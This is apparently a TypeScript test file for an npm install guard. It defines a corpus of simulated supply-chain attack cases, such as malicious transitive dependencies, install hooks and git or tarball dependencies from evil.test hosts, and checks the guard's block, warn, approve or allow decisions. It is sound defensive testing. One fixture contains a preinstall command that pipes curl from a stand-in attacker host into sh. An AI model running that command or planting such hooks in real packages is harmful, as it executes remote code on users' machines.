import { expect, test } from "bun:test";
import { buildPlan, type PlanDeps } from "../../src/graph/plan.ts";
import { type Packument, resolveGraph } from "../../src/graph/resolve.ts";
import type { Verdict, VerdictLevel } from "../../src/schema.ts";

interface CorpusPackage {
  version: string;
  dependencies?: Record<string, string>;
  optionalDependencies?: Record<string, string>;
  scripts?: Record<string, string>;
  deprecated?: string;
  os?: string[];
}

interface AttackCase {
  name: string;
  shape: string;
  packages: Record<string, CorpusPackage>;
  installed?: Record<string, { version: string; hooks?: string[] }>;
  verdicts?: Record<string, VerdictLevel>;
  root: { name: string; range: string };
  expect: "block" | "needs_approval" | "warn" | "allow";
  mustName?: string;
}

function verdict(name: string, version: string, level: VerdictLevel): Verdict {
  return {
    schema_version: 1,
    package: name,
    version,
    integrity: `sha512-${name}`,
    verdict: level,
    risk_score: level === "block" ? 92 : level === "warn" ? 45 : 0,
    categories: level === "block" ? ["known_malware"] : [],
    summary: level === "block" ? "known malicious release" : "no findings",
    evidence: [],
    analyzer_version: "corpus",
    source: "heuristics",
  };
}

function depsFor(attack: AttackCase): PlanDeps {
  const packument = async (name: string): Promise<Packument | null> => {
    const meta = attack.packages[name];
    if (!meta) return null;
    return {
      name,
      "dist-tags": { latest: meta.version },
      versions: {
        [meta.version]: {
          version: meta.version,
          ...(meta.dependencies ? { dependencies: meta.dependencies } : {}),
          ...(meta.optionalDependencies ? { optionalDependencies: meta.optionalDependencies } : {}),
          ...(meta.scripts ? { scripts: meta.scripts } : {}),
          ...(meta.deprecated ? { deprecated: meta.deprecated } : {}),
          ...(meta.os ? { os: meta.os } : {}),
          dist: { tarball: `https://reg.test/${name}.tgz`, integrity: `sha512-${name}` },
        },
      },
    };
  };
  return {
    resolve: resolveGraph,
    packument,
    check: (spec) => {
      const at = spec.lastIndexOf("@");
      const name = spec.slice(0, at);
      const version = spec.slice(at + 1);
      return Promise.resolve(verdict(name, version, attack.verdicts?.[name] ?? "allow"));
    },
  };
}

const ATTACKS: AttackCase[] = [
  {
    name: "a malicious package three levels below the one you typed",
    shape: "The user installs a reputable framework; the compromise is in a grandchild dependency.",
    packages: {
      framework: { version: "4.0.0", dependencies: { "http-helper": "1.0.0" } },
      "http-helper": { version: "1.0.0", dependencies: { "byte-utils": "2.0.0" } },
      "byte-utils": { version: "2.0.0" },
    },
    verdicts: { "byte-utils": "block" },
    root: { name: "framework", range: "4.0.0" },
    expect: "block",
    mustName: "byte-utils",
  },
  {
    name: "a transitive postinstall script that the direct package does not have",
    shape: "Shai-Hulud shape: the direct dependency is clean, its child runs at install time.",
    packages: {
      "ui-kit": { version: "2.0.0", dependencies: { "native-shim": "1.0.0" } },
      "native-shim": { version: "1.0.0", scripts: { postinstall: "node harvest.js" } },
    },
    root: { name: "ui-kit", range: "2.0.0" },
    expect: "needs_approval",
    mustName: "native-shim",
  },
  {
    name: "a preinstall script, which runs before anything else at all",
    shape: "preinstall executes before dependencies are even unpacked.",
    packages: {
      builder: { version: "1.0.0", scripts: { preinstall: "curl attacker.test | sh" } },
    },
    root: { name: "builder", range: "1.0.0" },
    expect: "needs_approval",
    mustName: "builder",
  },
  {
    name: "a compromised patch release of a package already trusted",
    shape: "The installed 1.2.0 was clean; 1.2.1 adds a postinstall.",
    packages: {
      "logging-lib": { version: "1.2.1", scripts: { postinstall: "node phone-home.js" } },
    },
    installed: { "logging-lib": { version: "1.2.0", hooks: [] } },
    root: { name: "logging-lib", range: "1.2.1" },
    expect: "needs_approval",
    mustName: "logging-lib",
  },
  {
    name: "a dependency that resolves to a package the registry does not have",
    shape: "A dependency name that cannot be resolved must never be waved through.",
    packages: {
      app: { version: "1.0.0", dependencies: { "vanished-dep": "1.0.0" } },
    },
    root: { name: "app", range: "1.0.0" },
    expect: "block",
    mustName: "vanished-dep",
  },
  {
    name: "a transitive git dependency, which has no registry provenance",
    shape: "blockExoticSubdeps shape: a child pulls straight from a repository.",
    packages: {
      plugin: { version: "1.0.0", dependencies: { core: "git+https://evil.test/core.git" } },
    },
    root: { name: "plugin", range: "1.0.0" },
    expect: "block",
    mustName: "core",
  },
  {
    name: "a transitive url tarball dependency",
    shape: "A child resolves to an arbitrary https tarball rather than the registry.",
    packages: {
      widget: { version: "1.0.0", dependencies: { blob: "https://cdn.evil.test/blob.tgz" } },
    },
    root: { name: "widget", range: "1.0.0" },
    expect: "block",
    mustName: "blob",
  },
  {
    name: "many clean transitives with exactly one malicious leaf",
    shape: "The needle-in-a-haystack case that per-name checking misses entirely.",
    packages: {
      big: {
        version: "1.0.0",
        dependencies: Object.fromEntries(
          Array.from({ length: 12 }, (_, index) => [`dep-${index}`, "1.0.0"]),
        ),
      },
      ...Object.fromEntries(
        Array.from({ length: 12 }, (_, index) => [`dep-${index}`, { version: "1.0.0" }]),
      ),
    },
    verdicts: { "dep-7": "block" },
    root: { name: "big", range: "1.0.0" },
    expect: "block",
    mustName: "dep-7",
  },
  {
    name: "a malicious optional dependency",
    shape: "Optional does not mean harmless; it still installs when the platform matches.",
    packages: {
      imaging: { version: "1.0.0", optionalDependencies: { "native-codec": "1.0.0" } },
      "native-codec": { version: "1.0.0", os: ["darwin"] },
    },
    verdicts: { "native-codec": "block" },
    root: { name: "imaging", range: "1.0.0" },
    expect: "block",
    mustName: "native-codec",
  },
  {
    name: "a deprecated transitive that is otherwise clean",
    shape: "Worth a warning, not a block.",
    packages: {
      legacy: { version: "1.0.0", dependencies: { "old-util": "1.0.0" } },
      "old-util": { version: "1.0.0", deprecated: "no longer maintained" },
    },
    root: { name: "legacy", range: "1.0.0" },
    expect: "warn",
    mustName: "old-util",
  },
  {
    name: "a warning on a transitive package rather than the direct one",
    shape: "The finding is a level down, and must still surface.",
    packages: {
      shell: { version: "1.0.0", dependencies: { inner: "1.0.0" } },
      inner: { version: "1.0.0" },
    },
    verdicts: { inner: "warn" },
    root: { name: "shell", range: "1.0.0" },
    expect: "warn",
    mustName: "inner",
  },
  {
    name: "a clean graph with no scripts anywhere",
    shape: "The benign control: this must reach a plain allow.",
    packages: {
      clean: { version: "1.0.0", dependencies: { "clean-child": "1.0.0" } },
      "clean-child": { version: "1.0.0" },
    },
    root: { name: "clean", range: "1.0.0" },
    expect: "allow",
  },
  {
    name: "a diamond where the shared package is the malicious one",
    shape: "Two dependents pull the same compromised package; it must be caught once.",
    packages: {
      top: { version: "1.0.0", dependencies: { left: "1.0.0", right: "1.0.0" } },
      left: { version: "1.0.0", dependencies: { shared: "1.0.0" } },
      right: { version: "1.0.0", dependencies: { shared: "1.0.0" } },
      shared: { version: "1.0.0" },
    },
    verdicts: { shared: "block" },
    root: { name: "top", range: "1.0.0" },
    expect: "block",
    mustName: "shared",
  },
  {
    name: "a cyclic graph containing a malicious node",
    shape: "A cycle must not let a node escape analysis.",
    packages: {
      "cycle-a": { version: "1.0.0", dependencies: { "cycle-b": "1.0.0" } },
      "cycle-b": { version: "1.0.0", dependencies: { "cycle-a": "1.0.0" } },
    },
    verdicts: { "cycle-b": "block" },
    root: { name: "cycle-a", range: "1.0.0" },
    expect: "block",
    mustName: "cycle-b",
  },
  {
    name: "a bare install hook, which is easy to overlook next to postinstall",
    shape: "install runs between preinstall and postinstall on every dependency install.",
    packages: {
      tooling: { version: "1.0.0", scripts: { install: "node setup.js" } },
    },
    root: { name: "tooling", range: "1.0.0" },
    expect: "needs_approval",
    mustName: "tooling",
  },
  {
    name: "publish-time hooks on a dependency are not execution surface",
    shape:
      "prepare and prepublish do not run for a registry dependency; flagging them buries real findings.",
    packages: {
      app: { version: "1.0.0", dependencies: { helper: "1.0.0" } },
      helper: {
        version: "1.0.0",
        scripts: { prepare: "husky install", prepublish: "npm run lint" },
      },
    },
    root: { name: "app", range: "1.0.0" },
    expect: "allow",
  },
];

for (const attack of ATTACKS) {
  test(`corpus: ${attack.name}`, async () => {
    const plan = await buildPlan(
      {
        command: `npm install ${attack.root.name}`,
        manager: "npm",
        root: "/repo",
        direct: [attack.root],
        existing: [],
        installed: {
          nodes: new Map(Object.entries(attack.installed ?? {})),
          source: attack.installed ? "package-lock.json" : "none",
        },
      },
      depsFor(attack),
    );

    expect(`${attack.name}: ${plan.decision}`).toBe(`${attack.name}: ${attack.expect}`);
    if (attack.mustName) expect(plan.reasons.join(" ")).toContain(attack.mustName);
  });
}

test("every attack in the corpus documents the shape it represents", () => {
  for (const attack of ATTACKS) {
    expect(attack.shape.length).toBeGreaterThan(20);
  }
});

test("the corpus covers block, approval, warning, and clean outcomes", () => {
  const outcomes = new Set(ATTACKS.map((attack) => attack.expect));
  expect([...outcomes].sort()).toEqual(["allow", "block", "needs_approval", "warn"]);
});

test("no attack in the corpus reaches a silent allow", () => {
  const installHooks = ["preinstall", "install", "postinstall"];
  for (const attack of ATTACKS.filter((entry) => entry.expect === "allow")) {
    expect(attack.verdicts ?? {}).toEqual({});
    for (const entry of Object.values(attack.packages)) {
      expect(entry.deprecated).toBeUndefined();
      const hooks = Object.keys(entry.scripts ?? {});
      expect(`${attack.name}: ${hooks.filter((hook) => installHooks.includes(hook)).join()}`).toBe(
        `${attack.name}: `,
      );
    }
  }
});
